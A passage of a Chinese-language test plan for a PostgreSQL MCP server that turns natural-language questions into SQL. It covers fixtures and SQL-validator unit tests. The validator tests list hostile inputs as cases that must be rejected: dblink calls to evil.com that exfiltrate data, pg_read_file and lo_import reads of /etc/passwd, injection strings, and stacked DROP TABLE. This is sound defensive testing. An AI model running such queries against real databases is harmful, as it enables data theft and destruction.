# PostgreSQL MCP Server - 测试计划

## 文档信息

| 项目       | 内容                        |
|------------|----------------------------|
| 文档版本   | v1.0                       |
| 创建日期   | 2025-12-20                 |
| 状态       | 草稿                       |
| 关联设计   | 0002-pg-mcp-design.md      |
| 关联实现   | 0004-pg-mcp-impl-plan.md   |
| 项目代号   | pg-mcp                     |

---

## 1. 测试策略总览

### 1.1 测试目标

1. **功能正确性**：验证所有组件按设计规范正确工作
2. **安全性保障**：确保 SQL 安全验证器能阻止所有恶意 SQL
3. **性能达标**：验证系统满足性能要求（端到端延迟 < 5s）
4. **弹性可靠**：验证熔断器、限流器等弹性组件正常工作
5. **集成正确性**：验证组件间协作正常，MCP 协议正确实现

### 1.2 测试原则

1. **测试金字塔**：单元测试 > 集成测试 > E2E 测试
2. **安全优先**：SQL 验证器必须 100% 覆盖所有安全场景
3. **Mock 隔离**：单元测试使用 Mock 隔离外部依赖
4. **真实验证**：集成测试使用真实 PostgreSQL 实例
5. **自动化**：所有测试必须可自动化运行

### 1.3 测试金字塔

```
                    ┌───────────────┐
                    │    E2E Tests  │  (10%)
                    │  - MCP 协议   │
                    │  - 完整流程   │
                    └───────┬───────┘
                            │
               ┌────────────┴────────────┐
               │    Integration Tests    │  (25%)
               │  - Schema 缓存加载      │
               │  - SQL 执行（真实 DB）  │
               │  - LLM 调用（Mock）     │
               └────────────┬────────────┘
                            │
       ┌────────────────────┴────────────────────┐
       │              Unit Tests                  │  (65%)
       │  - SQLValidator 安全验证                │
       │  - Pydantic 模型验证                    │
       │  - SQL 解析和提取                       │
       │  - 熔断器/限流器逻辑                    │
       │  - 结果序列化                           │
       └──────────────────────────────────────────┘
```

### 1.4 覆盖率要求

| 组件类型       | 覆盖率要求 | 说明                     |
|----------------|-----------|--------------------------|
| SQL 验证器     | ≥ 95%     | 安全核心，必须高覆盖     |
| 核心服务组件   | ≥ 85%     | 包括 Generator, Executor |
| 弹性组件       | ≥ 90%     | 熔断器、限流器           |
| 配置与模型     | ≥ 80%     | Pydantic 验证逻辑        |
| 整体代码库     | ≥ 80%     | 总体目标                 |

---

## 2. 测试环境

### 2.1 环境配置

```yaml
# 测试环境要求
environments:
  unit_tests:
    python: ">=3.11"
    dependencies:
      - pytest>=8.0.0
      - pytest-asyncio>=0.24.0
      - pytest-cov>=5.0.0
      - pytest-mock>=3.14.0
      - aioresponses>=0.7.6    # Mock aiohttp
      - respx>=0.21.0          # Mock httpx

  integration_tests:
    python: ">=3.11"
    postgresql: ">=14.0"
    docker: required
    dependencies:
      - testcontainers>=4.0.0  # 动态创建测试容器
      - pytest-docker>=3.0.0

  e2e_tests:
    python: ">=3.11"
    postgresql: ">=14.0"
    openai_api: mock_server   # 使用 Mock 服务器
```

### 2.2 测试数据库

```sql
-- tests/fixtures/test_schema.sql

-- 测试用表结构
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(256) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    status VARCHAR(20) DEFAULT 'active'
);

CREATE TABLE orders (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    total_amount DECIMAL(10, 2) NOT NULL,
    status VARCHAR(20) DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE products (
    id SERIAL PRIMARY KEY,
    name VARCHAR(200) NOT NULL,
    price DECIMAL(10, 2) NOT NULL,
    category VARCHAR(50),
    inventory_count INTEGER DEFAULT 0
);

CREATE TABLE order_items (
    id SERIAL PRIMARY KEY,
    order_id INTEGER REFERENCES orders(id),
    product_id INTEGER REFERENCES products(id),
    quantity INTEGER NOT NULL,
    unit_price DECIMAL(10, 2) NOT NULL
);

-- 敏感表（用于测试阻止访问）
CREATE TABLE secret_data (
    id SERIAL PRIMARY KEY,
    api_key VARCHAR(256),
    internal_notes TEXT
);

-- 视图
CREATE VIEW order_summary AS
SELECT
    u.username,
    o.id as order_id,
    o.total_amount,
    o.status,
    o.created_at
FROM orders o
JOIN users u ON u.id = o.user_id;

-- 枚举类型
CREATE TYPE order_status AS ENUM ('pending', 'processing', 'shipped', 'delivered', 'cancelled');

-- 测试数据
INSERT INTO users (username, email, password_hash) VALUES
    ('alice', 'alice@example.com', 'hash1'),
    ('bob', 'bob@example.com', 'hash2'),
    ('charlie', 'charlie@example.com', 'hash3');

INSERT INTO products (name, price, category, inventory_count) VALUES
    ('Widget A', 29.99, 'Electronics', 100),
    ('Widget B', 49.99, 'Electronics', 50),
    ('Gadget C', 19.99, 'Accessories', 200);

INSERT INTO orders (user_id, total_amount, status) VALUES
    (1, 79.98, 'delivered'),
    (1, 49.99, 'pending'),
    (2, 29.99, 'shipped');
```

### 2.3 pytest 配置

```python
# tests/conftest.py

import asyncio
import os
from typing import AsyncGenerator, Generator

import asyncpg
import pytest
import pytest_asyncio
from unittest.mock import AsyncMock, MagicMock

from pg_mcp.config.settings import (
    Settings, DatabaseConfig, OpenAIConfig,
    SecurityConfig, ValidationConfig, CacheConfig, ResilienceConfig
)
from pg_mcp.services.sql_validator import SQLValidator
from pg_mcp.services.sql_generator import SQLGenerator
from pg_mcp.models.schema import DatabaseSchema, TableInfo, ColumnInfo


# ============== 事件循环配置 ==============

@pytest.fixture(scope="session")
def event_loop() -> Generator[asyncio.AbstractEventLoop, None, None]:
    """创建会话级别的事件循环"""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


# ============== 配置 Fixtures ==============

@pytest.fixture
def security_config() -> SecurityConfig:
    """标准安全配置"""
    return SecurityConfig(
        query_timeout_seconds=30,
        max_result_rows=1000,
        blocked_tables=["secret_data", "users.password_hash"],
        blocked_columns=["password_hash", "api_key"],
        blocked_functions=["pg_sleep", "lo_import"],
        allow_explain=False,
        readonly_role="readonly",
        safe_search_path="public",
    )


@pytest.fixture
def security_config_permissive() -> SecurityConfig:
    """宽松安全配置（用于特定测试）"""
    return SecurityConfig(
        query_timeout_seconds=60,
        max_result_rows=10000,
        blocked_tables=[],
        blocked_columns=[],
        allow_explain=True,
    )


@pytest.fixture
def openai_config() -> OpenAIConfig:
    """OpenAI 配置"""
    return OpenAIConfig(
        api_key="sk-test-key",
        model="gpt-4",
        max_tokens=4096,
        temperature=0.0,
        timeout=30.0,
    )


@pytest.fixture
def database_config() -> DatabaseConfig:
    """测试数据库配置"""
    return DatabaseConfig(
        name="test_db",
        host=os.getenv("TEST_DB_HOST", "localhost"),
        port=int(os.getenv("TEST_DB_PORT", "5432")),
        user=os.getenv("TEST_DB_USER", "postgres"),
        password=os.getenv("TEST_DB_PASSWORD", "postgres"),
        database=os.getenv("TEST_DB_NAME", "test_pg_mcp"),
        ssl_mode="disable",
        min_connections=1,
        max_connections=5,
    )


@pytest.fixture
def settings(database_config, openai_config, security_config) -> Settings:
    """完整配置"""
    return Settings(
        service_name="pg-mcp-test",
        log_level="DEBUG",
        log_format="text",
        databases=[database_config],
        openai=openai_config,
        security=security_config,
        validation=ValidationConfig(enabled=True, confidence_threshold=70),
        cache=CacheConfig(auto_refresh=False),
        resilience=ResilienceConfig(),
    )


# ============== 验证器 Fixtures ==============

@pytest.fixture
def sql_validator(security_config) -> SQLValidator:
    """SQL 验证器实例"""
    return SQLValidator(security_config)


@pytest.fixture
def sql_validator_permissive(security_config_permissive) -> SQLValidator:
    """宽松配置的 SQL 验证器"""
    return SQLValidator(security_config_permissive)


# ============== Mock Fixtures ==============

@pytest.fixture
def mock_openai_client() -> AsyncMock:
    """Mock OpenAI 客户端"""
    mock = AsyncMock()
    mock.chat.completions.create = AsyncMock(return_value=MagicMock(
        choices=[MagicMock(message=MagicMock(content="```sql\nSELECT * FROM users;\n```"))],
        usage=MagicMock(total_tokens=100),
    ))
    return mock


@pytest.fixture
def mock_asyncpg_pool() -> AsyncMock:
    """Mock asyncpg 连接池"""
    pool = AsyncMock()
    conn = AsyncMock()
    conn.fetch = AsyncMock(return_value=[
        {"id": 1, "username": "alice"},
        {"id": 2, "username": "bob"},
    ])
    conn.transaction = MagicMock(return_value=AsyncMock())
    pool.acquire = MagicMock(return_value=AsyncMock(__aenter__=AsyncMock(return_value=conn)))
    return pool


# ============== Schema Fixtures ==============

@pytest.fixture
def sample_schema() -> DatabaseSchema:
    """样例数据库 Schema"""
    return DatabaseSchema(
        database_name="test_db",
        tables=[
            TableInfo(
                schema_name="public",
                table_name="users",
                columns=[
                    ColumnInfo(name="id", data_type="integer", is_nullable=False, is_primary_key=True),
                    ColumnInfo(name="username", data_type="varchar", is_nullable=False),
                    ColumnInfo(name="email", data_type="varchar", is_nullable=False),
                    ColumnInfo(name="created_at", data_type="timestamp", is_nullable=True),
                ],
                primary_key=["id"],
            ),
            TableInfo(
                schema_name="public",
                table_name="orders",
                columns=[
                    ColumnInfo(name="id", data_type="integer", is_nullable=False, is_primary_key=True),
                    ColumnInfo(name="user_id", data_type="integer", is_nullable=False),
                    ColumnInfo(name="total_amount", data_type="decimal", is_nullable=False),
                    ColumnInfo(name="status", data_type="varchar", is_nullable=True),
                ],
                primary_key=["id"],
            ),
        ],
        views=[],
        enum_types=[],
    )


# ============== 数据库 Fixtures（集成测试用）==============

@pytest_asyncio.fixture
async def real_pg_pool(database_config) -> AsyncGenerator[asyncpg.Pool, None]:
    """真实 PostgreSQL 连接池"""
    pool = await asyncpg.create_pool(
        host=database_config.host,
        port=database_config.port,
        user=database_config.user,
        password=database_config.password.get_secret_value(),
        database=database_config.database,
        min_size=1,
        max_size=5,
    )
    yield pool
    await pool.close()


@pytest_asyncio.fixture
async def setup_test_db(real_pg_pool) -> AsyncGenerator[None, None]:
    """初始化测试数据库"""
    async with real_pg_pool.acquire() as conn:
        # 读取并执行测试 schema
        schema_file = os.path.join(os.path.dirname(__file__), "fixtures", "test_schema.sql")
        with open(schema_file) as f:
            await conn.execute(f.read())

    yield

    # 清理（可选）
    async with real_pg_pool.acquire() as conn:
        await conn.execute("DROP TABLE IF EXISTS order_items, orders, products, users, secret_data CASCADE")
```

---

## 3. 单元测试计划

### 3.1 SQL 验证器测试（最高优先级）

SQL 验证器是整个系统的安全核心，必须有最全面的测试覆盖。

```python
# tests/unit/test_sql_validator.py

import pytest
from pg_mcp.services.sql_validator import SQLValidator
from pg_mcp.models.errors import SecurityViolationError


class TestValidSelectStatements:
    """测试合法的 SELECT 语句"""

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users",
        "SELECT id, username FROM users",
        "SELECT * FROM users WHERE id = 1",
        "SELECT * FROM users WHERE username LIKE '%test%'",
        "SELECT COUNT(*) FROM users",
        "SELECT COUNT(*), AVG(total_amount) FROM orders",
    ])
    def test_simple_select_valid(self, sql_validator, sql):
        """简单 SELECT 语句应该通过验证"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is True
        assert error is None

    @pytest.mark.parametrize("sql", [
        "SELECT u.*, o.total_amount FROM users u JOIN orders o ON u.id = o.user_id",
        "SELECT * FROM users u LEFT JOIN orders o ON u.id = o.user_id",
        "SELECT * FROM users u INNER JOIN orders o ON u.id = o.user_id WHERE o.status = 'pending'",
        "SELECT * FROM orders o JOIN order_items oi ON o.id = oi.order_id JOIN products p ON oi.product_id = p.id",
    ])
    def test_join_queries_valid(self, sql_validator, sql):
        """JOIN 查询应该通过验证"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is True

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)",
        "SELECT * FROM users WHERE EXISTS (SELECT 1 FROM orders WHERE orders.user_id = users.id)",
        "SELECT *, (SELECT COUNT(*) FROM orders WHERE orders.user_id = users.id) as order_count FROM users",
    ])
    def test_subquery_select_valid(self, sql_validator, sql):
        """包含只读子查询的语句应该通过验证"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is True

    @pytest.mark.parametrize("sql", [
        """
        WITH recent_orders AS (
            SELECT * FROM orders WHERE created_at > NOW() - INTERVAL '7 days'
        )
        SELECT * FROM recent_orders
        """,
        """
        WITH user_stats AS (
            SELECT user_id, COUNT(*) as order_count, SUM(total_amount) as total_spent
            FROM orders GROUP BY user_id
        )
        SELECT u.username, us.order_count, us.total_spent
        FROM users u JOIN user_stats us ON u.id = us.user_id
        """,
    ])
    def test_cte_queries_valid(self, sql_validator, sql):
        """CTE (WITH) 查询应该通过验证"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is True

    @pytest.mark.parametrize("sql", [
        "SELECT ROW_NUMBER() OVER (ORDER BY created_at DESC) as rn, * FROM orders",
        "SELECT *, SUM(total_amount) OVER (PARTITION BY user_id) as user_total FROM orders",
        "SELECT *, LAG(total_amount) OVER (PARTITION BY user_id ORDER BY created_at) as prev_amount FROM orders",
    ])
    def test_window_functions_valid(self, sql_validator, sql):
        """窗口函数应该通过验证"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is True

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users LIMIT 100",
        "SELECT * FROM users OFFSET 10 LIMIT 20",
        "SELECT * FROM users ORDER BY created_at DESC LIMIT 10",
    ])
    def test_limit_offset_valid(self, sql_validator, sql):
        """LIMIT/OFFSET 子句应该通过验证"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is True


class TestRejectedDMLStatements:
    """测试必须拒绝的 DML 语句"""

    @pytest.mark.parametrize("sql,expected_type", [
        ("INSERT INTO users (username, email) VALUES ('test', 'test@test.com')", "Insert"),
        ("INSERT INTO users SELECT * FROM temp_users", "Insert"),
    ])
    def test_insert_rejected(self, sql_validator, sql, expected_type):
        """INSERT 语句必须被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False
        assert "不允许" in error or "Insert" in error

    @pytest.mark.parametrize("sql", [
        "UPDATE users SET username = 'hacked' WHERE id = 1",
        "UPDATE users SET email = 'test@test.com'",
        "UPDATE orders o SET status = 'cancelled' FROM users u WHERE u.id = o.user_id AND u.username = 'alice'",
    ])
    def test_update_rejected(self, sql_validator, sql):
        """UPDATE 语句必须被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False
        assert "不允许" in error or "Update" in error

    @pytest.mark.parametrize("sql", [
        "DELETE FROM users WHERE id = 1",
        "DELETE FROM users",
        "DELETE FROM orders WHERE user_id IN (SELECT id FROM users WHERE status = 'inactive')",
    ])
    def test_delete_rejected(self, sql_validator, sql):
        """DELETE 语句必须被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False
        assert "不允许" in error or "Delete" in error


class TestRejectedDDLStatements:
    """测试必须拒绝的 DDL 语句"""

    @pytest.mark.parametrize("sql", [
        "DROP TABLE users",
        "DROP TABLE IF EXISTS users CASCADE",
        "DROP DATABASE test_db",
        "DROP SCHEMA public CASCADE",
    ])
    def test_drop_rejected(self, sql_validator, sql):
        """DROP 语句必须被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    @pytest.mark.parametrize("sql", [
        "CREATE TABLE new_table (id INT)",
        "CREATE INDEX idx_users_email ON users(email)",
        "CREATE VIEW user_view AS SELECT * FROM users",
        "CREATE DATABASE new_db",
    ])
    def test_create_rejected(self, sql_validator, sql):
        """CREATE 语句必须被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    @pytest.mark.parametrize("sql", [
        "ALTER TABLE users ADD COLUMN phone VARCHAR(20)",
        "ALTER TABLE users DROP COLUMN email",
        "ALTER TABLE users RENAME TO old_users",
    ])
    def test_alter_rejected(self, sql_validator, sql):
        """ALTER 语句必须被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    @pytest.mark.parametrize("sql", [
        "TRUNCATE users",
        "TRUNCATE TABLE users CASCADE",
    ])
    def test_truncate_rejected(self, sql_validator, sql):
        """TRUNCATE 语句必须被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    @pytest.mark.parametrize("sql", [
        "GRANT SELECT ON users TO readonly_user",
        "REVOKE ALL ON users FROM public",
    ])
    def test_grant_revoke_rejected(self, sql_validator, sql):
        """GRANT/REVOKE 语句必须被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False


class TestDangerousFunctions:
    """测试危险函数检测"""

    @pytest.mark.parametrize("sql,func_name", [
        ("SELECT pg_sleep(10)", "pg_sleep"),
        ("SELECT * FROM users WHERE pg_sleep(1) IS NOT NULL", "pg_sleep"),
        ("SELECT pg_sleep(1), * FROM users", "pg_sleep"),
    ])
    def test_pg_sleep_blocked(self, sql_validator, sql, func_name):
        """pg_sleep 必须被阻止"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False
        assert func_name in error.lower()

    @pytest.mark.parametrize("sql,func_name", [
        ("SELECT pg_read_file('/etc/passwd')", "pg_read_file"),
        ("SELECT pg_read_binary_file('/etc/passwd')", "pg_read_binary_file"),
        ("SELECT pg_ls_dir('/tmp')", "pg_ls_dir"),
        ("SELECT pg_stat_file('/etc/passwd')", "pg_stat_file"),
    ])
    def test_file_access_functions_blocked(self, sql_validator, sql, func_name):
        """文件访问函数必须被阻止"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    @pytest.mark.parametrize("sql", [
        "SELECT lo_import('/etc/passwd')",
        "SELECT lo_export(12345, '/tmp/data.txt')",
    ])
    def test_large_object_functions_blocked(self, sql_validator, sql):
        """大对象函数必须被阻止"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    @pytest.mark.parametrize("sql", [
        "SELECT pg_terminate_backend(1234)",
        "SELECT pg_cancel_backend(1234)",
        "SELECT pg_reload_conf()",
        "SELECT pg_rotate_logfile()",
    ])
    def test_admin_functions_blocked(self, sql_validator, sql):
        """管理函数必须被阻止"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    @pytest.mark.parametrize("sql", [
        "SELECT dblink('host=evil.com', 'SELECT * FROM passwords')",
        "SELECT dblink_exec('host=evil.com', 'DROP TABLE users')",
    ])
    def test_dblink_blocked(self, sql_validator, sql):
        """dblink 函数必须被阻止"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    def test_custom_blocked_function(self, security_config):
        """测试自定义阻止函数"""
        security_config.blocked_functions = ["custom_dangerous_func"]
        validator = SQLValidator(security_config)

        is_valid, error = validator.validate("SELECT custom_dangerous_func()")
        assert is_valid is False


class TestSensitiveResourceBlocking:
    """测试敏感资源访问阻止"""

    def test_blocked_table_rejected(self, sql_validator):
        """访问被阻止的表应该被拒绝"""
        is_valid, error = sql_validator.validate("SELECT * FROM secret_data")
        assert is_valid is False
        assert "secret_data" in error.lower()

    def test_blocked_table_in_join_rejected(self, sql_validator):
        """在 JOIN 中访问被阻止的表应该被拒绝"""
        is_valid, error = sql_validator.validate(
            "SELECT * FROM users u JOIN secret_data s ON u.id = s.user_id"
        )
        assert is_valid is False

    def test_blocked_table_in_subquery_rejected(self, sql_validator):
        """在子查询中访问被阻止的表应该被拒绝"""
        is_valid, error = sql_validator.validate(
            "SELECT * FROM users WHERE id IN (SELECT user_id FROM secret_data)"
        )
        assert is_valid is False

    def test_blocked_column_rejected(self, sql_validator):
        """访问被阻止的列应该被拒绝"""
        is_valid, error = sql_validator.validate("SELECT password_hash FROM users")
        assert is_valid is False
        assert "password_hash" in error.lower()

    def test_blocked_column_with_table_prefix_rejected(self, sql_validator):
        """使用表前缀访问被阻止的列应该被拒绝"""
        is_valid, error = sql_validator.validate("SELECT u.password_hash FROM users u")
        assert is_valid is False

    def test_blocked_column_in_where_rejected(self, sql_validator):
        """在 WHERE 子句中使用被阻止的列应该被拒绝"""
        is_valid, error = sql_validator.validate(
            "SELECT * FROM users WHERE password_hash = 'test'"
        )
        assert is_valid is False


class TestMultiStatementBlocking:
    """测试多语句阻止"""

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users; DROP TABLE users;",
        "SELECT 1; SELECT 2;",
        "SELECT * FROM users; DELETE FROM users;",
    ])
    def test_multiple_statements_rejected(self, sql_validator, sql):
        """多语句应该被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False
        assert "多条" in error or "multiple" in error.lower()


class TestSQLInjectionPrevention:
    """测试 SQL 注入防护"""

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users WHERE id = 1; DROP TABLE users; --",
        "SELECT * FROM users WHERE id = 1 UNION SELECT * FROM secret_data",
        "SELECT * FROM users WHERE username = '' OR '1'='1'",
        "SELECT * FROM users WHERE id = 1; INSERT INTO users VALUES (100, 'hacker');",
    ])
    def test_injection_attempts_blocked(self, sql_validator, sql):
        """SQL 注入尝试应该被阻止"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False


class TestSubquerySafety:
    """测试子查询安全性"""

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users WHERE id IN (DELETE FROM orders RETURNING user_id)",
        "SELECT * FROM users WHERE id = (UPDATE orders SET status = 'x' WHERE id = 1 RETURNING user_id)",
    ])
    def test_dml_in_subquery_rejected(self, sql_validator, sql):
        """子查询中的 DML 应该被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False


class TestEdgeCases:
    """测试边界情况"""

    @pytest.mark.parametrize("sql", [
        "",
        "   ",
        "\n\t",
    ])
    def test_empty_sql_rejected(self, sql_validator, sql):
        """空 SQL 应该被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    @pytest.mark.parametrize("sql", [
        "SELECT * FORM users",  # FORM instead of FROM
        "SELEC * FROM users",   # SELEC instead of SELECT
        "SELECT * FROM",        # Incomplete
        "SELECT",               # Just keyword
    ])
    def test_malformed_sql_rejected(self, sql_validator, sql):
        """格式错误的 SQL 应该被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    @pytest.mark.parametrize("sql", [
        "-- This is a comment",
        "/* block comment */",
        "-- SELECT * FROM users",
    ])
    def test_comment_only_rejected(self, sql_validator, sql):
        """只有注释的 SQL 应该被拒绝"""
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is False

    def test_very_long_sql(self, sql_validator):
        """非常长的 SQL 应该能正常处理"""
        # 生成一个有 100 个 OR 条件的查询
        conditions = " OR ".join([f"id = {i}" for i in range(100)])
        sql = f"SELECT * FROM users WHERE {conditions}"

        is_valid, error = sql_validator.validate(sql)
        assert is_valid is True

    def test_unicode_in_sql(self, sql_validator):
        """包含 Unicode 的 SQL 应该能正常处理"""
        sql = "SELECT * FROM users WHERE username = '中文用户名'"
        is_valid, error = sql_validator.validate(sql)
        assert is_valid is True


class TestExplainHandling:
    """测试 EXPLAIN 语句处理"""

    def test_explain_blocked_by_default(self, sql_validator):
        """默认情况下 EXPLAIN 应该被阻止"""
        is_valid, error = sql_validator.validate("EXPLAIN SELECT * FROM users")
        assert is_valid is False

    def test_explain_allowed_when_configured(self, sql_validator_permissive):
        """配置允许时 EXPLAIN 应该通过"""
        is_valid, error = sql_validator_permissive.validate("EXPLAIN SELECT * FROM users")
        assert is_valid is True

    def test_explain_analyze_blocked_by_default(self, sql_validator):
        """EXPLAIN ANALYZE 应该被阻止"""
        is_valid, error = sql_validator.validate("EXPLAIN ANALYZE SELECT * FROM users")
        assert is_valid is False


class TestSQLNormalization:
    """测试 SQL 规范化功能"""

    def test_normalize_simple_select(self, sql_validator):
        """简单 SELECT 的规范化"""
        sql = "select * from users where id=1"
        normalized = sql_validator.normalize_sql(sql)
        assert "SELECT" in normalized  # 关键字大写
        assert "FROM" in normalized
        assert "WHERE" in normalized

    def test_normalize_preserves_semantics(self, sql_validator):
        """规范化应该保持语义不变"""
        sql = "SELECT  id,  username  FROM  users"
        normalized = sql_validator.normalize_sql(sql)
        # 验证规范化后仍然有效
        is_valid, _ = sql_validator.validate(normalized)
        assert is_valid is True


class TestTableExtraction:
    """测试表名提取功能"""

    def test_extract_single_table(self, sql_validator):
        """提取单个表名"""
        tables = sql_validator.extract_tables("SELECT * FROM users")
        assert "public.users" in tables

    def test_extract_multiple_tables(self, sql_validator):
        """提取多个表名"""
        tables = sql_validator.extract_tables(
            "SELECT * FROM users u JOIN orders o ON u.id = o.user_id"
        )
        assert "public.users" in tables
        assert "public.orders" in tables

    def test_extract_tables_from_subquery(self, sql_validator):
        """从子查询中提取表名"""
        tables = sql_validator.extract_tables(
            "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)"
        )
        assert "public.users" in tables
        assert "public.orders" in tables
```

### 3.2 配置和模型测试

```python
# tests/unit/test_config.py

import pytest
from pydantic import ValidationError

from pg_mcp.config.settings import (
    Settings, DatabaseConfig, OpenAIConfig,
    SecurityConfig, ValidationConfig
)


class TestDatabaseConfig:
    """测试数据库配置验证"""

    def test_valid_config(self):
        """有效配置应该通过验证"""
        config = DatabaseConfig(
            name="test",
            host="localhost",
            port=5432,
            user="postgres",
            password="secret",
            database="testdb",
        )
        assert config.name == "test"
        assert config.ssl_mode == "prefer"  # 默认值

    def test_invalid_port_range(self):
        """端口范围验证"""
        with pytest.raises(ValidationError):
            DatabaseConfig(
                name="test",
                port=70000,  # 超出范围
                user="postgres",
                password="secret",
                database="testdb",
            )

    def test_invalid_ssl_mode(self):
        """SSL 模式验证"""
        with pytest.raises(ValidationError):
            DatabaseConfig(
                name="test",
                user="postgres",
                password="secret",
                database="testdb",
                ssl_mode="invalid",
            )

    @pytest.mark.parametrize("ssl_mode", [
        "disable", "allow", "prefer", "require", "verify-ca", "verify-full"
    ])
    def test_valid_ssl_modes(self, ssl_mode):
        """所有有效的 SSL 模式"""
        config = DatabaseConfig(
            name="test",
            user="postgres",
            password="secret",
            database="testdb",
            ssl_mode=ssl_mode,
        )
        assert config.ssl_mode == ssl_mode


class TestSecurityConfig:
    """测试安全配置"""

    def test_default_blocked_functions(self):
        """默认危险函数列表"""
        config = SecurityConfig()
        assert "pg_sleep" in config.blocked_functions
        assert "lo_import" in config.blocked_functions

    def test_query_timeout_range(self):
        """查询超时范围验证"""
        with pytest.raises(ValidationError):
            SecurityConfig(query_timeout_seconds=0)

        with pytest.raises(ValidationError):
            SecurityConfig(query_timeout_seconds=500)  # > 300

    def test_max_result_rows_range(self):
        """最大返回行数范围验证"""
        with pytest.raises(ValidationError):
            SecurityConfig(max_result_rows=0)

        with pytest.raises(ValidationError):
            SecurityConfig(max_result_rows=200000)  # > 100000


class TestSettings:
    """测试主配置类"""

    def test_at_least_one_database_required(self):
        """至少需要配置一个数据库"""
        with pytest.raises(ValidationError) as exc_info:
            Settings(databases=[])
        assert "至少需要配置一个数据库" in str(exc_info.value)

    def test_unique_database_names(self):
        """数据库名称必须唯一"""
        db1 = DatabaseConfig(name="db1", user="u", password="p", database="d")
        db2 = DatabaseConfig(name="db1", user="u", password="p", database="d")  # 重复名称

        with pytest.raises(ValidationError) as exc_info:
            Settings(databases=[db1, db2])
        assert "唯一" in str(exc_info.value)

    def test_log_level_validation(self):
        """日志级别验证"""
        with pytest.raises(ValidationError):
            Settings(
                log_level="INVALID",
                databases=[DatabaseConfig(name="db", user="u", password="p", database="d")]
            )


class TestValidationConfig:
    """测试验证配置"""

    def test_confidence_threshold_range(self):
        """置信度阈值范围验证"""
        with pytest.raises(ValidationError):
            ValidationConfig(confidence_threshold=-1)

        with pytest.raises(ValidationError):
            ValidationConfig(confidence_threshold=101)

    def test_max_retries_range(self):
        """最大重试次数范围验证"""
        with pytest.raises(ValidationError):
            ValidationConfig(max_retries=-1)

        with pytest.raises(ValidationError):
            ValidationConfig(max_retries=10)  # > 5
```

### 3.3 模型测试

```python
# tests/unit/test_models.py

import pytest
from datetime import datetime
from pydantic import ValidationError

from pg_mcp.models.schema import (
    DatabaseSchema, TableInfo, ColumnInfo,
    ForeignKeyInfo, IndexInfo, EnumTypeInfo
)
from pg_mcp.models.query import (
    QueryRequest, QueryResponse, QueryResult,
    ReturnType, ValidationResult
)
from pg_mcp.models.errors import (
    ErrorCode, ErrorDetail, PgMcpError,
    SecurityViolationError, LLMError
)


class TestSchemaModels:
    """测试 Schema 模型"""

    def test_column_info_creation(self):
        """列信息创建"""
        col = ColumnInfo(
            name="id",
            data_type="integer",
            is_nullable=False,
            is_primary_key=True,
        )
        assert col.name == "id"
        assert col.is_primary_key is True

    def test_table_info_with_relations(self):
        """表信息包含关系"""
        table = TableInfo(
            schema_name="public",
            table_name="orders",
            columns=[
                ColumnInfo(name="id", data_type="integer", is_nullable=False),
                ColumnInfo(name="user_id", data_type="integer", is_nullable=False),
            ],
            primary_key=["id"],
            foreign_keys=[
                ForeignKeyInfo(
                    column="user_id",
                    references_table="users",
                    references_column="id",
                    constraint_name="fk_orders_user",
                )
            ],
        )
        assert len(table.foreign_keys) == 1
        assert table.foreign_keys[0].references_table == "users"

    def test_database_schema_get_table(self, sample_schema):
        """获取表信息"""
        table = sample_schema.get_table("users")
        assert table is not None
        assert table.table_name == "users"

        # 不存在的表
        assert sample_schema.get_table("nonexistent") is None

    def test_database_schema_to_prompt_context(self, sample_schema):
        """生成 Prompt 上下文"""
        context = sample_schema.to_prompt_context()
        assert "users" in context
        assert "orders" in context
        assert "id" in context
        assert "username" in context


class TestQueryModels:
    """测试查询模型"""

    def test_query_request_validation(self):
        """查询请求验证"""
        request = QueryRequest(
            question="查询所有用户",
            database="test_db",
            return_type=ReturnType.RESULT,
        )
        assert request.question == "查询所有用户"

    def test_query_request_question_required(self):
        """问题字段必填"""
        with pytest.raises(ValidationError):
            QueryRequest(question="")

    def test_query_request_question_max_length(self):
        """问题最大长度限制"""
        with pytest.raises(ValidationError):
            QueryRequest(question="a" * 10001)  # > 10000

    def test_query_response_success(self):
        """成功响应"""
        response = QueryResponse(
            success=True,
            data=QueryResult(
